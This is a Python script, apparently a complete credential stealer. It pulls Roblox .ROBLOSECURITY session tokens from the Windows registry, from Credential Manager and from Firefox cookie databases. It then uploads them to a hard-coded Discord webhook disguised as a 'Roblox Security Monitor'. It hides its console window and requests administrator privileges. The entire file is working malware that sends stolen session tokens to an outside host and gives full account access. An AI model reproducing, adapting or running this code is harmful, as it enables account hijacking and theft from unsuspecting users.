import winreg
import re
import requests
import json
import win32cred
import sqlite3
import os
import glob
from pathlib import Path
from tempfile import gettempdir
import shutil
import ctypes
import sys
import time
import logging
import traceback

# ===== CONFIGURATION =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1359977927755829298/JSNqxdtp1_PDXKhdIUQS6TS3l3kv5YBx6JPVxwLWxi08H7I-w3x_6Xt-bEj7lz_VnbUU"  # Replace with your Discord webhook URL
BOT_NAME = "Roblox Security Monitor"  # Custom name for the webhook bot
AVATAR_URL = "https://i.imgur.com/r5bwsO6.png"  # Roblox logo
# =========================

# Configure logging
log_file = os.path.join(os.getenv('TEMP'), 'roblox_token_collector.log')
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def hide_console():
    """Hide the console window if running from compiled executable"""
    if getattr(sys, 'frozen', False):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def is_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_token_from_registry():
    """Extract .ROBLOSECURITY token from Windows registry"""
    tokens = []
    try:
        reg_path = r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
        value_data, _ = winreg.QueryValueEx(key, ".ROBLOSECURITY")
        winreg.CloseKey(key)
        
        token_match = re.search(r'COOK::<([^>]+)>', value_data)
        if token_match:
            tokens.append({
                "token": token_match.group(1),
                "source": "Windows Registry (Roblox Studio)",
                "raw_data": value_data
            })
            logging.info("Found token in Registry")
    except Exception as e:
        logging.error(f"Registry error: {str(e)}")
    return tokens

def get_token_from_credential_manager():
    """Extract token from Windows Credential Manager"""
    tokens = []
    try:
        creds = win32cred.CredEnumerate(None, 0)
        for cred in creds:
            target = cred['TargetName']
            if 'roblox' in target.lower() and 'RobloxStudioAuth' in target:
                blob = cred['CredentialBlob']
                if isinstance(blob, bytes):
                    try:
                        decoded = blob.decode('utf-16-le').strip('\x00')
                    except UnicodeDecodeError:
                        decoded = blob.decode('utf-8', errors='ignore')
                    
                    token_match = re.search(r'COOK::<([^>]+)>', decoded)
                    if token_match:
                        token = token_match.group(1)
                    elif decoded.startswith('_|'):
                        token = decoded
                    else:
                        continue
                        
                    tokens.append({
                        "token": token,
                        "source": f"Credential Manager: {target}",
                        "raw_data": decoded
                    })
                    logging.info(f"Found token in Credential Manager: {target}")
    except Exception as e:
        logging.error(f"Credential Manager error: {str(e)}")
    return tokens

def get_token_from_firefox():
    """Extract .ROBLOSECURITY token from Firefox browser"""
    tokens = []
    try:
        profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        if not os.path.exists(profiles_path):
            return tokens
            
        cookie_files = glob.glob(os.path.join(profiles_path, '*', 'cookies.sqlite'))
        
        for cookie_file in cookie_files:
            try:
                profile_name = Path(cookie_file).parent.name
                temp_db = os.path.join(gettempdir(), f'firefox_cookies_{profile_name}.sqlite')
                shutil.copy2(cookie_file, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT value, host, path, expiry, isSecure FROM moz_cookies "
                    "WHERE (host = '.roblox.com' OR host = 'www.roblox.com') "
                    "AND name = '.ROBLOSECURITY'"
                )
                results = cursor.fetchall()
                conn.close()
                os.remove(temp_db)
                
                for value, host, path, expiry, isSecure in results:
                    tokens.append({
                        "token": value,
                        "source": f"Firefox Profile: {profile_name}",
                        "details": f"Host: {host}, Path: {path}, Secure: {bool(isSecure)}, Expiry: {expiry}"
                    })
                    logging.info(f"Found token in Firefox profile: {profile_name}")
            except Exception as e:
                logging.error(f"Firefox error ({profile_name}): {str(e)}")
    except Exception as e:
        logging.error(f"Firefox general error: {str(e)}")
    return tokens

def save_tokens_to_file(tokens, file_path):
    """Save all tokens to a text file with formatting"""
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write("Roblox Token Report\n")
            f.write("=" * 50 + "\n\n")
            f.write("IMPORTANT: DELETE THIS FILE AFTER USE! THESE TOKENS PROVIDE FULL ACCOUNT ACCESS!\n\n")
            
            for i, token_info in enumerate(tokens, 1):
                f.write(f"TOKEN #{i}\n")
                f.write(f"Source: {token_info['source']}\n")
                f.write(f"Token: {token_info['token']}\n")
                
                if 'details' in token_info:
                    f.write(f"Details: {token_info['details']}\n")
                if 'raw_data' in token_info:
                    f.write(f"Raw Data: {token_info['raw_data'][:200]}...\n")
                
                f.write("\n" + "-" * 50 + "\n\n")
        
        return True
    except Exception as e:
        logging.error(f"Error saving tokens to file: {str(e)}")
        return False

def send_file_to_discord(file_path):
    """Send a file to Discord via webhook with custom bot name"""
    try:
        message = "Roblox tokens collected. **DELETE THIS FILE AFTER USE!**"
        
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            payload = {
                "content": message,
                "username": BOT_NAME,
                "avatar_url": AVATAR_URL
            }
            response = requests.post(
                WEBHOOK_URL,
                data=payload,
                files=files,
                timeout=30
            )
        
        return response.status_code in [200, 204]
    except Exception as e:
        logging.error(f"Error sending file to Discord: {str(e)}")
        return False

def main():
    """Main function to find and send tokens from all sources"""
    logging.info("Roblox Token Collector started")
    
    # Get tokens from all sources
    all_tokens = []
    all_tokens.extend(get_token_from_registry())
    all_tokens.extend(get_token_from_credential_manager())
    all_tokens.extend(get_token_from_firefox())
    
    if not all_tokens:
        logging.warning("No tokens found in any location")
        return
    
    logging.info(f"Found {len(all_tokens)} tokens")
    
    # Save tokens to a temporary file
    token_file = os.path.join(gettempdir(), 'Roblox_Tokens.txt')
    if not save_tokens_to_file(all_tokens, token_file):
        logging.error("Failed to save tokens to file")
        return
    
    # Send the file to Discord
    if send_file_to_discord(token_file):
        logging.info("Token file sent successfully to Discord")
    else:
        logging.error("Failed to send token file to Discord")
    
    # Clean up - delete the temporary file
    try:
        os.remove(token_file)
        logging.info("Temporary token file deleted")
    except Exception as e:
        logging.error(f"Error deleting token file: {str(e)}")

def run_as_admin():
    """Run the script with admin privileges if needed"""
    if not is_admin():
        logging.info("Requesting administrator privileges")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        main()

if __name__ == "__main__":
    hide_console()  # Hide console window
    try:
        run_as_admin()
    except Exception as e:
        error_msg = f"Critical error: {str(e)}\n{traceback.format_exc()}"
        logging.critical(error_msg)